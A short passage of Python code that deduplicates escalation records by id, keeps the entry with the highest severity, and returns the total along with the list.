            if fid not in seen or self.SEVERITY_ORDER.index(sev) > self.SEVERITY_ORDER.index(seen[fid]["new_severity"]):
                seen[fid] = e
        deduped = list(seen.values())
        return {
            "total_escalations": len(deduped),
            "escalations": deduped,
        }
